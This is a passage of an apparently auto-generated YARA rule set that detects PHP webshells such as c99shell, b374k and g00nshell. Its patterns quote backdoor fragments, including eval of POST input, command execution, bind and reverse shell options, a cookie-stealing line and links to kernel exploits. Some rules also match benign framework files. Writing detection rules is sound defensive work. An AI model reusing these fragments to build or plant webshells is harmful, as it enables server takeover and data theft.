      $s3 = "tIvRjA7VfLIB8Jg4HDko3TjIUGpvWQF0UI0th6OhylLuafvQclVNtSMIT5en4nPfr9qXf2k1nvTh8/2HwWBDpC3KWV9yxeHa9I1spytRzqjEvrDTwrINlfsYtS1ET6fh" ascii
      $s4 = "67jU196EEVkBDqIUlT4ngLMtXBJQ9ltB3S48RudC3LAyXw0V1K5AOn/mSMLB+aLOg4wp2/qOekhYofhb4b9npWxZIkoFMb87TcV/109OOKFIKL2HleSpG9ujdmsfaZTo" ascii
      $s5 = "YKpacV6KW9nDTAUcOVF35nCzXhADAJn+AaIRCWkV5fu2lWYVsDlSEj28MYVE0AEcrsfKM9w5ZNKPeCRFi9BTy1D2pu5JVJoQs/Ek2A8TkNoim0eOCcxQ5eOcHmLbmQW8" ascii
      $s6 = "SGEtWUiwdc4rarHWGhrQFvVsTaPtnUMoj/3Mem3rTt/XnXBv1CEbf/Y7F7rBLeb1rplo1rD632Vyt2mtBAb9fTnLkAhRRt61a/1OfiyVxUjcL+jsUJPjLBMzjjdBQk6M" ascii
      $s7 = "ftW3Yel3tC+QCcxAImEZZdBImck8n0uHw8Qj+0pQvii/LADCufLp/3Rwz9uuUuJSe/BRM6NWMMaVvmiOATgVxMlDXKyce95J+7Z13CQJpT7Iagh8deBRjIrcpSkx75yD" ascii
      $s8 = "LYDLa8rpjjOmcBhuokZNFedL44PXe6S7Fxn4T8gEYIMqB64Es2bmK90N1OMSSxvJa533LGQlfhQuQ3pkna9Avq/pmKInsjOwJXBZUfRXDprpEYH5GJWUVg6CJWFcEloG" ascii
      $s9 = "in69IDdWarMq/OmtUdcnl7rcLOGw4qlPW7ZrZOyxeVCNcDV1uL0DD90zKomltlldo+rn9zLubuZvMRzK64RiObeyivwJsSotZS/rNUvdkIkarjo2NeVWhSX5R8JzNw2v" ascii
      $s10 = "[32].$i1907[0].$i1907[42].$i1907[32].$i1907[18], $zEIRhg7829  ,\"9436\", 1);" fullword ascii
      $s11 = "0aZWjb+N5X/Po0wkbUn89sKEYLRTi4i6f1a18rctpmi2e6ZHebcFOomnrJGmNL9Bq0C193zB01coJjxVKtQKYx78xkQnhUClbXwHlLlkU+3jzrrUskqhuBxptsKrTOW+" ascii
      $s12 = "JmyWkIpFuM6nQ2FweBAMsknnMN0EwhAYr7DIjermtY1OFzuYgEW4jYsdL29Aq7klPVo5aRvPByc5+5DRuNTQ0tG6OXG7lE0VVELupFPMFvi5BdKyox3qq5W+ibTMQYun" ascii
      $s13 = "KzqhP/NOhyKqvZy6UWihAyrPwBT4Ake7+66j7OIMJiKlnvm6zKLA8VjmKnFM7NAOfc2OqLpZZNpPNZpJ5LB0kAbHrUNW4W6tbqEFebKZjPhz0JD2DKlk+rLs9RHv1E+V" ascii
      $s14 = "JD5XgXr5senOZX0nWdlHSwdaTL//mmrIA5PBuLzZmLJvYEIPMT8f207VeeZzEADKGLnlBN0DsQhrng3dzUHckz/cDpiSHDN/O5HuCkIm08eq32FzIhPwGcTYSEXBts0z" ascii
      $s15 = "GhI7mImN1l4uJWjxRy9nOe/LXmNrRA0g9KDFTqk7c2aoPaF9rtT+XdO0q9UYCI8xdc99XczppDavM6tU4tHa93WNYqYTtb0Bt7GfUB5eERG2yVoysJePMy//loLu2qxV" ascii
      $s16 = "piqLssSNRXA6SA7Mj7zx8SVm2Hi69janx3oDR3vQUkZekBvEmO9Cb//sZxFGbZw/imqwcz9pWj/pB7ZP9EZ6TUz64wnTqaQHPAQcgJXwzCPRlsNCtUZczAgyMtu/H2Oh" ascii
      $s17 = "4s/ONWaJ25/jZ8ZunQwXlFVpoNVPYXgDPvgvuMtPl+fBrWge7QAgJPQCL8ijnV8YIEr5OSdEtGVapnxh+qyXTWTIrdwly//GlpOhEG65RUD72R655PVOnJ3K6QHCd7wU" ascii
      $s18 = "MEt11iBm4ZLTKFN2tKMITjwLywSnA7KYvAor0h3jrm9rl0J0rhmolJ68T8bYAHbxthHx4bk5DAVXJGWeG6WJJGZANJI/mXBMk//0ucTzPhhsxE6s7GSrzYLJ+AL3/VW7" ascii
      $s19 = "S/JBUOjaszfTUHIqYt+kMTqy8plbHhoqgv0wVeo1fpFOneimT0z1j1RQ7CIKexvF+cLzD4Gl4Hcfdj2kVTOYVduxz4pAH/tI4sm9+HQ6tds3evr/OOPduaJI2Bv3HSCe" ascii
      $s20 = "6/TYGFxLcFf0ycHccbyTagAXm+JvaVHAPzUk52DdreRiNiUcXHbVsmz4yEf07vK4xUGlQbcTHqcLAnxrhIyscHt7tzJzmeaoA9/zq2ifXbSinemrvGYKD65hpTI5gFik" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 70KB and
      8 of them
}



rule sig_7a46a87a95f54ab5afc04ff43e14a060d7062f26
{
   meta:
      description = "php17 - file 7a46a87a95f54ab5afc04ff43e14a060d7062f26.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "a198556031139dcbe1c02e2e6e668f4388f4b1277c90fcf425e6834b934df75e"
   strings:
      $x1 = "formhead(array('title'=>'Execute Command', 'onsubmit'=>'g(\\'shell\\',null,this.p1.value);return false;'));" fullword ascii
      $x2 = "<a href=\"javascript:g('shell',null,'','','','','<?php echo $charset;?>');\">Execute Command</a> | " fullword ascii
      $x3 = "2013 final</a>. Copyright (C) 2004-2013 <a href=\"http://www.4ngel.net\" target=\"_blank\">[S4T]</a> All Rights Reserved." fullword ascii
      $x4 = "p('<p><a href=\"http://w'.'ww.4'.'ng'.'el.net/php'.'sp'.'y/pl'.'ugin/\" target=\"_blank\">Get plugins</a></p>');" fullword ascii
      $x5 = "$res = execute(which('perl').\" /tmp/angel_bc \".$p2.\" \".$p3.\" &\");" fullword ascii
      $s6 = "$res = execute(\"/tmp/angel_bc \".$p2.\" \".$p3.\" &\");" fullword ascii
      $s7 = "<title><?php echo $act.' - '.$_SERVER['HTTP_HOST'];?></title>" fullword ascii
      $s8 = "p('<p class=\"red\">MySQL '.$DB->version().' running in '.$dbhost.' as '.$dbuser.'@'.$dbhost.'</p>');" fullword ascii
      $s9 = "p('<pre>'.execute($p1).'</pre>');" fullword ascii
      $s10 = "$attachsize = '<a href=\"javascript:g(\\'file\\', null, \\'getsize\\', \\''.$dirdb['filename'].'\\');\">Stat</a>';" fullword ascii
      $s11 = "m('Database has backup to <a href=\"'.$fileurl.'\" target=\"_blank\">'.$P['bak_path'].'</a>');" fullword ascii
      $s12 = "if( strpos( strtolower( $_SERVER['HTTP_USER_AGENT'] ), 'bot' ) !== false ) {" fullword ascii
      $s13 = "echo \"<p class=\\\"b\\\">Mysql error description: \".htmlspecialchars($this->geterrdesc()).\"</p>\\n\";" fullword ascii
      $s14 = "27 => array('Safe mode exec dir',getcfg('safe_mode_exec_dir'))," fullword ascii
      $s15 = "21 => array('upload_max_filesize',(getcfg('file_uploads') ? getcfg('upload_max_filesize') : 'Not allowed'))," fullword ascii
      $s16 = "formhead(array('title'=>'Eval PHP Code', 'onsubmit'=>'g(\\'eval\\',null,this.p1.value);return false;'));" fullword ascii
      $s17 = "<form onsubmit=\"g('file',this.cwd.value);return false;\" method=\"POST\" id=\"godir\" name=\"godir\">" fullword ascii
      $s18 = "<a href=\"javascript:g('portscan',null,'','','','','<?php echo $charset;?>');\">Port Scan</a> | " fullword ascii
      $s19 = "13 => array('Administrator',(isset($_SERVER['SERVER_ADMIN']) ? $_SERVER['SERVER_ADMIN'] : getcfg('sendmail_from')))," fullword ascii
      $s20 = "<meta http-equiv=\"Content-Type\" content=\"text/html; charset=<?php echo $charset;?>\">" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule php17_51mp3L
{
   meta:
      description = "php17 - file 51mp3L.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "ecd12aaf2a8b105c03ba8b1db2f50f6673a764c4288ef23dbfd677163cec34a4"
   strings:
      $s1 = "<textarea cols=140 rows=35 name=\"src\">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />" fullword ascii
      $s2 = "echo '<div id=\"content\"><table width=\"1000\" border=\"0\" cellpadding=\"3\" cellspacing=\"1\" align=\"center\">" fullword ascii
      $s3 = "echo '<font color=\"red\">File Upload Error ~_~.</font><br />';" fullword ascii
      $s4 = "New Name : <input name=\"newname\" type=\"text\" size=\"20\" value=\"'.$_POST['name'].'\" />" fullword ascii
      $s5 = "<td><center><form method=\\\"POST\\\" action=\\\"?option&path=$path\\\">" fullword ascii
      $s6 = "echo '<font color=\"green\">File Upload Done Kakak ~_^ .</font><br />';" fullword ascii
      $s7 = "if(is_writable(\"$path/$file\") || !is_readable(\"$path/$file\")) echo '</font>';" fullword ascii
      $s8 = "<input type=\"hidden\" name=\"path\" value=\"'.$_POST['path'].'\">" fullword ascii
      $s9 = "foreach($_POST as $key=>$value){" fullword ascii
      $s10 = "$_POST[$key] = stripslashes($value);" fullword ascii
      $s11 = "if(is_writable(\"$path/$dir\") || !is_readable(\"$path/$dir\")) echo '</font>';" fullword ascii
      $s12 = "}elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){" fullword ascii
      $s13 = "if(isset($_GET['option']) && $_POST['opt'] == 'delete'){" fullword ascii
      $s14 = "echo '<form enctype=\"multipart/form-data\" method=\"POST\">" fullword ascii
      $s15 = "if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){" fullword ascii
      $s16 = "echo '<font color=\"red\">Change Permission Error.</font><br />';" fullword ascii
      $s17 = "elseif(!is_readable(\"$path/$file\")) echo '<font color=\"red\">';" fullword ascii
      $s18 = "elseif(!is_readable(\"$path/$dir\")) echo '<font color=\"red\">';" fullword ascii
      $s19 = "if(rename($_POST['path'],$path.'/'.$_POST['newname'])){" fullword ascii
      $s20 = "<table width=\"1000\" border=\"0\" cellpadding=\"3\" cellspacing=\"1\" align=\"center\">" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 20KB and
      8 of them
}

rule AbstractValue
{
   meta:
      description = "php17 - file AbstractValue.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "b0a2282b9c840b8b715d8ce4cf0138ce40a89c09aa367a2e87671857cf0e68ec"
   strings:
      $s1 = "* @ORM\\OneToOne(targetEntity=\"\\Concrete\\Core\\Entity\\Attribute\\Value\\Value\\Value\")" fullword ascii
      $s2 = "* @ORM\\JoinColumn(name=\"avID\", referencedColumnName=\"avID\", onDelete=\"CASCADE\")" fullword ascii
      $s3 = "* @param mixed $attribute_value" fullword ascii
      $s4 = "public function getGenericValue()" fullword ascii
      $s5 = "namespace Concrete\\Core\\Entity\\Attribute\\Value\\Value;" fullword ascii
      $s6 = "* @ORM\\Id" fullword ascii
      $s7 = "* @ORM\\MappedSuperClass" fullword ascii
      $s8 = "use Doctrine\\ORM\\Mapping as ORM;" fullword ascii
      $s9 = "public function setGenericValue($generic_value)" fullword ascii
      $s10 = "$this->generic_value = $generic_value;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 2KB and
      all of them
}

rule AbstractGrid
{
   meta:
      description = "php17 - file AbstractGrid.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "fe72257716992c57c985365c053d0eaec44d8b6b9373d6669e81bd5b2d50de9b"
   strings:
      $s1 = "* @author    Ivan Vorontsov <ivan.vorontsov@phalconeye.com>" fullword ascii
      $s2 = "* @link      http://phalconeye.com/" fullword ascii
      $s3 = "| Copyright (c) 2013-2014 PhalconEye Team (http://phalconeye.com/)       |" fullword ascii
      $s4 = "| Author: Ivan Vorontsov <ivan.vorontsov@phalconeye.com>                 |" fullword ascii
      $s5 = "* @param array|\\Engine\\Db\\AbstractModel|\\Engine\\Grid\\GridItem|\\Phalcon\\Mvc\\Model\\Row $item One item object." fullword ascii
      $s6 = "$this->_response->setContent($this->render($this->getTableBodyView()));" fullword ascii
      $s7 = "* Grid column flag: use 'HAVING' in filter instead of 'WHERE' for query builder." fullword ascii
      $s8 = "* This can be a closure that will define output logic of value in this column." fullword ascii
      $s9 = "* Get item action (Edit, Delete, etc)." fullword ascii
      $s10 = "* @copyright 2013-2014 PhalconEye Team" fullword ascii
      $s11 = "* Get total items count." fullword ascii
      $s12 = "* Get current grid items." fullword ascii
      $s13 = "* Grid column filter control (type of \\Engine\\Form\\AbstractElement)." fullword ascii
      $s14 = "* Get items count per page." fullword ascii
      $s15 = "* Get source resolver." fullword ascii
      $s16 = "* Get router name." fullword ascii
      $s17 = "* Get grid identity." fullword ascii
      $s18 = "* Get request param." fullword ascii
      $s19 = "| to license@phalconeye.com so we can send you a copy immediately.       |" fullword ascii
      $s20 = "if ($item instanceof AbstractModel && method_exists($item, 'getGridActions')) {" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 20KB and
      8 of them
}

rule sig_0663a4ddceacb40b095eda264a85f15c
{
   meta:
      description = "php17 - file 0663a4ddceacb40b095eda264a85f15c.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "01e7c95ffe299c757677f0eaf69745178ee5a374ceb64652d4a673bf365cdc8b"
   strings:
      $x1 = "<center><input type=submit value='File List' name=filelist> - <input type=submit value='View PhpInfo' name=phpinfo> - <input typ" ascii
      $x2 = "='Cmd Execution' name='commex'> - <input type='submit' name='logeraser' value='Logs Eraser'> - <input type='submit' name='connec" ascii
      $s3 = "// Dump Database [pacucci.com]" fullword ascii
      $s4 = "if(isset($_POST['dump']) && isset($user) && isset($pass) && isset($db)){" fullword ascii
      $s5 = "$millink=\"http://milw0rm.com/search.php?dong=Linux Kernel\".$Lversion;" fullword ascii
      $s6 = "$mysql = mysql_connect(\"localhost\", $user, $pass)or die(\"<script>alert('Connection Failed')</script>\");" fullword ascii
      $s7 = "$aids = passthru(\"perl cbs.pl \".$_POST['connhost'].\" \".$_POST['connport']);" fullword ascii
      $s8 = "$dump = \"-- Database: \".$_POST['db'] .\" \\n\";" fullword ascii
      $s9 = "<input type='submit' value='Sorguyu Calistir' name='godb'><br><input type='submit' name='dump' value='Database'yi Dump Et'>" fullword ascii
      $s10 = "$headers .= \"\\r\\nContent-Type: multipart/alternative; boundary=\\\"PHP-alt-\".$random_hash.\"\\\"\";" fullword ascii
      $s11 = "<b>IP:</b> <u>\" . $_SERVER['REMOTE_ADDR'] .\"</u> - Server IP:</b> <a href='http://whois.domaintools.com/\". $_SERVER['SERVER_A" ascii
      $s12 = "<b>IP:</b> <u>\" . $_SERVER['REMOTE_ADDR'] .\"</u> - Server IP:</b> <a href='http://whois.domaintools.com/\". $_SERVER['SERVER_A" ascii
      $s13 = "<font size='1' face='Verdana'>Username: - Password:</font><br>" fullword ascii
      $s14 = "$dump .= \"-- CWShellDumper v3\\n\";" fullword ascii
      $s15 = "shell_exec(stripslashes($_POST['cmd']));" fullword ascii
      $s16 = "exec(stripslashes($_POST['cmd']));" fullword ascii
      $s17 = "<form method='post' action=''><input type='text' name='connhost' size='15'value='target'> <input type='text' name='connport' siz" ascii
      $s18 = "elseif(eregi('config',$listz) && eregi('.php',$listz)) { @$listf.= '<tr><td valign=top><img src=?com=image&img=file><font siz" fullword ascii
      $s19 = "$millink=\"http://milw0rm.com/search.php?dong=\".$OSV.\" \".$Lversion;" fullword ascii
      $s20 = "<center><b><font size='2' face='Verdana'>Safe-Mode Bypass[Dosyalar]<br></font></b>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 100KB and
      1 of ($x*) and 4 of them
}

rule sig_1bc95c69745b50619a937e830bc085b2c6c90094
{
   meta:
      description = "php17 - file 1bc95c69745b50619a937e830bc085b2c6c90094.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "565d9583cf9b7117ba1c7af86a0f8e520fad9b02397f34b6ac784094d9b4eba4"
   strings:
      $x1 = "$uakey = \"724ea055b975621b9d679f7077257bd9\"; // MD5 encoded user-agent" fullword ascii
      $x2 = "$act = array('cmd'=>'Command Execute','files'=>'File View','phpinfo'=>'PHP info', 'phpexec'=>'PHP Execute'," fullword ascii
      $x3 = "if(exec(\"wget $file -b -O $updir/$filex\")){die(\"File has been uploaded.\");}" fullword ascii
      $x4 = "req = urllib2.Request('http://www.seologs.com/ip-domains.html', urllib.urlencode({'domainname' : sys.argv[1]}))" fullword ascii
      $x5 = "$pass = \"8634361d1a2e44420f44ef3612706bb5\"; // MD5 encoded Password" fullword ascii
      $s6 = "\"raptor - Linux <= 2.6.17.4\"=>\"http://someshit.net/files/xpl/raptor\"," fullword ascii
      $s7 = "unset($_SESSION['sql_user'], $_SESSION['sql_password'], $_SESSION['sql_host'], $_SESSION['sql_port']);" fullword ascii
      $s8 = "'Running Processes'=>'ps -aux', 'Uname'=>'uname -a', 'Get UID'=>'id'," fullword ascii
      $s9 = "'tools'=>'Tools','sqllogin'=>'SQL','email'=>'Email','upload'=>'Get Files','lookup'=>'List Domains','bshell'=>'Bindshell','kill'=" ascii
      $s10 = "#'http://site.com/shl.php?cookie='+document.cookies</script> #" fullword ascii
      $s11 = "$IP = array(\"127.0.0.2\",\"127.0.0.1\"); // IP Addresses allowed to access shell" fullword ascii
      $s12 = "\"rootbsd - BSD v?\"=>\"http://someshit.net/files/xpl/rootbsd\"," fullword ascii
      $s13 = "$user = \"55c4b3899b00d20543d41170d2775e8f\"; // MD5 encoded User" fullword ascii
      $s14 = "function cmd(){ // Command execution function" fullword ascii
      $s15 = "#To execute commands, simply include ?cmd=___ in the url. #" fullword ascii
      $s16 = "\"Basic Perl bindshell\"=>\"http://packetstormsecurity.org/groups/synnergy/bindshell-unix\"," fullword ascii
      $s17 = "<title>g00nshell v\" . $version . \" - \" . $servip . \"</title>\\n" fullword ascii
      $s18 = "'tools'=>'Tools','sqllogin'=>'SQL','email'=>'Email','upload'=>'Get Files','lookup'=>'List Domains','bshell'=>'Bindshell','kill'=" ascii
      $s19 = "\"h00lyshit - Linux 2.6 ALL\"=>\"http://someshit.net/files/xpl/h00lyshit\"," fullword ascii
      $s20 = "#Ex: http://site.com/shl.php?cmd=whoami #" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 90KB and
      1 of ($x*) and 4 of them
}

rule sig_4dc83604feba00d25385077508e59f66240a0697
{
   meta:
      description = "php17 - file 4dc83604feba00d25385077508e59f66240a0697.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "9b15e74fea8ba54d12b52627e55c8a3dea6867fb42802b358311d6fc58ceb877"
   strings:
      $s1 = "$a=\"<?php @eval(\".\"$\".\"_POST\".\"[tese])?>\";file_put_contents('demo.php',$a);" fullword ascii
      $s2 = "file_put_contents('demo', base64_decode());" fullword ascii
      $s3 = "ini_set('maxdb_execution_time', 0);" fullword ascii
      $s4 = "if(!file_exists('demo.php')){" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule AnsiLogger
{
   meta:
      description = "php17 - file AnsiLogger.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "c1b69a147055ae4717236bc419fa328ddee48f49a79e316cf8e34efa284f398f"
   strings:
      $s1 = "* (c) Daniel Leech <daniel@dantleech.com>" fullword ascii
      $s2 = "'<info>subject</info> %s<info> with </info>%s<info> iteration(s) of </info>%s<info> rev(s),</info>'," fullword ascii
      $s3 = "namespace PhpBench\\Progress\\Logger;" fullword ascii
      $s4 = "sprintf('%s', $variant->getSubject()->getName())," fullword ascii
      $s5 = "* This file is part of the PHPBench package" fullword ascii
      $s6 = "json_encode($variant->getParameterSet()->getArrayCopy(), true)" fullword ascii
      $s7 = "abstract class AnsiLogger extends PhpBenchLogger" fullword ascii
      $s8 = "$this->output->write(\"\\x1B[\". 4 . 'A'); // put the cursor back to the line with the measurements" fullword ascii
      $s9 = "$variant->getRevolutions()" fullword ascii
      $s10 = "$this->output->write(\"\\x1B[0G\"); // put the cursor back at col 0" fullword ascii
      $s11 = "protected function renderCollectionStatus(Variant $variant)" fullword ascii
      $s12 = "$this->output->write(\"\\x1B[0J\"); // clear the line" fullword ascii
      $s13 = "'<info>parameters</info> %s'," fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 3KB and
      8 of them
}

rule add_group
{
   meta:
      description = "php17 - file add_group.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "ff3f6562846ad3ad5f02b3bd67a1936bde1bbf2219e609fda4e3926fe853b0b1"
   strings:
      $x1 = "$g->setAutomationOptions($this->post('gCheckAutomationOnRegister'), $this->post('gCheckAutomationOnLogin'), $this->p" fullword ascii
      $s2 = "$g->setBadgeOptions($this->post('gBadgeFID'), $this->post('gBadgeDescription'), $this->post('gBadgeCommunityPointValue'));" fullword ascii
      $s3 = "$g->setBadgeOptions($this->post('gBadgeFID'), $this->post('gBadgeDescription'), $this->post('gBadgeCommunityPointVal" fullword ascii
      $s4 = "$this->error->add(t('You do not have permission to add a group beneath %s', $parentGroup->getGroupDisplayName())" fullword ascii
      $s5 = "$this->error->add(t('You do not have permission to add a group beneath %s', $parentGroup->getGroupDisplayName()));" fullword ascii
      $s6 = "$g->setGroupExpirationByDateTime($date->translate('gUserExpirationSetDateTime'), $this->request->post('gUser" fullword ascii
      $s7 = "$g->setGroupExpirationByInterval($this->request->post('gUserExpirationIntervalDays'), $this->request->post('" fullword ascii
      $s8 = "$g = ConcreteGroup::add($gName, $this->request->post('gDescription'), $parentGroup);" fullword ascii
      $s9 = "$this->error->add(t('You must specify a description for this badge. It will be displayed publicly.'));" fullword ascii
      $s10 = "namespace Concrete\\Controller\\SinglePage\\Dashboard\\Users;" fullword ascii
      $s11 = "$g->setAutomationOptions($this->post('gCheckAutomationOnRegister'), $this->post('gCheckAutomationOnLogin'), $this->post('gCheckA" ascii
      $s12 = "switch ($this->request->post('gUserExpirationMethod')) {" fullword ascii
      $s13 = "$this->redirect('/dashboard/users/groups', 'group_added');" fullword ascii
      $s14 = "if ($this->request->post('gUserExpirationIsEnabled')) {" fullword ascii
      $s15 = "$parentGroupNode = TreeNode::getByID($this->request->post('gParentNodeID'));" fullword ascii
      $s16 = "$gDescription = $this->request->post('gDescription');" fullword ascii
      $s17 = "if (!$this->post('gBadgeDescription')) {" fullword ascii
      $s18 = "$this->error->add($valt->getErrorMessage());" fullword ascii
      $s19 = "$parentGroup = $parentGroupNode->getTreeNodeGroupObject();" fullword ascii
      $s20 = "$gName = $txt->sanitize($this->request->post('gName'));" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 10KB and
      1 of ($x*) and 4 of them
}

rule sig_2ce82609eacd98d699c55f5871a481df170dad7b
{
   meta:
      description = "php17 - file 2ce82609eacd98d699c55f5871a481df170dad7b.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "5948b3866d8458e4517d4f3851947e940167410032ea4347626c6d6e403c2d2a"
   strings:
      $s1 = "${$__}[!$_](${$__}[$_]); // $_POST[0]($_POST[1]);" fullword ascii
      $s2 = "$__.=(\"{\"^\"/\"); // _POST " fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_41b8b081f2b83539627868eedc561698009572ec
{
   meta:
      description = "php17 - file 41b8b081f2b83539627868eedc561698009572ec.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "0f48b973f87a067fbb02638c69597f0ef24c759e1d3bbafccb9e480da8754d67"
   strings:
      $x1 = "cmd'])) echo \"\"; else echo \"- shell command -\";?>' placeholder='- shell command -'/>" fullword ascii
      $x2 = "$s_rsbind[\"bind_win\"] = \"Bind Shell <span style='font-size:12px;color:#999;'>- windows executable</span>\";" fullword ascii
      $x3 = "$s_rsback[\"back_win\"] = \"Reverse Shell <span style='font-size:12px;color:#999;'>- windows executable</span>\";" fullword ascii
      $x4 = "$s_rspesanb = \"Run &#39;  nc -l -v -p <i>port</i>  &#39; on your computer and press &#39;  Go !  &#39; button\";" fullword ascii
      $x5 = "if(buff.value == '- shell command -') buff.value = '';" fullword ascii
      $x6 = "<?php if(isset($_REQUEST['login'])) echo \"if(d.getElementById('login')) d.getElementById('login').focus();\"; ?>" fullword ascii
      $x7 = "elseif($s_sqltype=='oracle') $s_dump_tbl = \"SELECT * FROM \".$s_rows.\".\".$s_tables.\" WHERE ROWNUM BETWEEN 0 AND 100;\";" fullword ascii
      $s8 = "elseif($s_sqltype=='sqlite' || $s_sqltype=='sqlite3') $s_dump_tbl = \"SELECT * FROM \".$s_tables.\" LIMIT 0,100\";" fullword ascii
      $s9 = "elseif($s_sqltype=='pgsql') $s_dump_tbl = \"SELECT * FROM \".$s_rows.\".\".$s_tables.\" LIMIT 100 OFFSET 0\";" fullword ascii
      $s10 = "elseif($s_split[0]==\"back\") $s_rstarget_packed = $s_rsport_.\" \".$s_rshost_;" fullword ascii
      $s11 = "$s_rsbind[\"bind_py\"] = \"Bind Shell <span style='font-size:12px;color:#999;'>- python</span>\";" fullword ascii
      $s12 = "setcookie(\"b374k_included\", \"0\" ,time() - $s_login_time);" fullword ascii
      $s13 = "$s_result .= \"<tr><td>perl</td><td>\".exe(\"perl -e \\\"print \\$s_]\\\"\").\"</td></tr>\";" fullword ascii
      $s14 = "if($s_sqltype=='mysql') $s_dump_tbl = \"SELECT * FROM \".$s_rows.\".\".$s_tables.\" LIMIT 0,100\";" fullword ascii
      $s15 = "if(function_exists('pg_connect')) return @pg_connect(\"$s_host_str user=$s_sqluser password=$s_sqlpass\");" fullword ascii
      $s16 = "$s_rsbind[\"bind_rb\"] = \"Bind Shell <span style='font-size:12px;color:#999;'>- ruby</span>\";" fullword ascii
      $s17 = "$s_rsbind[\"bind_php\"] = \"Bind Shell <span style='font-size:12px;color:#999;'>- php</span>\";" fullword ascii
      $s18 = "$s_rsbind[\"bind_pl\"] = \"Bind Shell <span style='font-size:12px;color:#999;'>- perl</span>\";" fullword ascii
      $s19 = "<link href='http://fonts.googleapis.com/css?family=Ubuntu+Mono:400,700' rel='stylesheet' type='text/css'>" fullword ascii
      $s20 = "## recoded b374k shell" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 300KB and
      1 of ($x*) and 4 of them
}

rule sig_502adcbc50636b667202497c1f398a36413e3284
{
   meta:
      description = "php17 - file 502adcbc50636b667202497c1f398a36413e3284.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "80fa31cc87c2618a5ea267baed3707f78b4b7d4a20cc8a91b231d5ce1d1a42e8"
   strings:
      $x1 = "am.ru/releases/cc99shell\\\">c99shell</a>: Access Denied - your host (\".getenv(\"REMOTE_ADDR\").\") not allow\");}" fullword ascii
      $x2 = "if ($win) {$file = \"C:\\\\tmp\\\\dump_\".$SERVER_NAME.\"_\".$db.\"_\".date(\"d-m-Y-H-i-s\").\".sql\";}" fullword ascii
      $x3 = "?><html><head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=windows-1251\"><meta http-equiv=\"Content-Language" ascii
      $x4 = "# \".gethostbyname($SERVER_ADDR).\" (\".$SERVER_ADDR.\")\".\" dump db \\\"\".$db.\"\\\"" fullword ascii
      $x5 = "?><table border=\"0\" width=\"100%\" height=\"1\"><tr><td width=\"30%\" height=\"1\"><b>Create new table:</b><form action=\"<?ph" ascii
      $x6 = "else {$file = \"/tmp/dump_\".$SERVER_NAME.\"_\".$db.\"_\".date(\"d-m-Y-H-i-s\").\".sql\";}" fullword ascii
      $x7 = "else {echo \"<b>Execution command</b>\";  if (empty($cmd_txt)) {$cmd_txt = true;}}" fullword ascii
      $x8 = "if (file_get_contents($v)) {echo \"<b><font color=\\\"red\\\">You can't crack winnt passwords(\".$v.\") </font></b><br>\";}" fullword ascii
      $s9 = "if (!preg_match($s,getenv(\"REMOTE_ADDR\")) and !preg_match($s,gethostbyaddr(getenv(\"REMOTE_ADDR\")))) {exit(\"<a href=\\\"http" ascii
      $s10 = "$out = \"# Dumped by C99Shell.SQL v. \".$shver.\"" fullword ascii
      $s11 = "if (md5(sha1(md5($anypass))) == \"b76d95e82e853f3b0a81dd61c4ee286c\") {header(\"HTTP/1.0 200 OK\"); @eval($anyphpcode);}" fullword ascii
      $s12 = "# MySQL version: (\".mysql_get_server_info().\") running on \".$SERVER_ADDR.\" (\".$SERVER_NAME.\")\".\"" fullword ascii
      $s13 = "if (eregi(\"%%%filedata%%%\",$data)) {$data = str_replace(\"%%%filedata%%%\",file_get_contents($v),$data);}" fullword ascii
      $s14 = "service.pwd */ $aliases[] = array(\"find service.pwd files in current dir\", \"find . -type f -name service.pwd\");" fullword ascii
      $s15 = "if (!$sock) {echo \"I can't connect to localhost:\".$bind[port].\"! I think you should configure your firewall.\";}" fullword ascii
      $s16 = "header(\"Content-disposition: attachment; filename=\\\"\".$f.\".txt\\\";\"); " fullword ascii
      $s17 = "config.inc.php */ $aliases[] = array(\"find config.inc.php files\", \"find / -type f -name config.inc.php\");" fullword ascii
      $s18 = "if (!empty($kill)) {$query = 'KILL ' . $kill . ';'; $result = mysql_query($query, $sql_sock); echo \"<b>Killing process #\".$" fullword ascii
      $s19 = "$acts = array(\"\",\"newdb\",\"serverstat\",\"servervars\",\"processes\",\"getfile\");" fullword ascii
      $s20 = "else {echo \"<br><a href=\\\"\".$surl.\"act=lsa&nixpasswd=1&d=\".$ud.\"\\\"><b><u>Get /etc/passwd</u></b></a><br>\";}" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 400KB and
      1 of ($x*) and 4 of them
}

rule sig_2017_10_07_140614_create_attachments_table
{
   meta:
      description = "php17 - file 2017_10_07_140614_create_attachments_table.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "b7068e1bf02e20c1ff12fa27d8b5e12e37985eb7257e23f9e167622a076b8f7b"
   strings:
      $s1 = "Schema::create('attachments', function (Blueprint $table)" fullword ascii
      $s2 = "Schema::dropIfExists('attachments');" fullword ascii
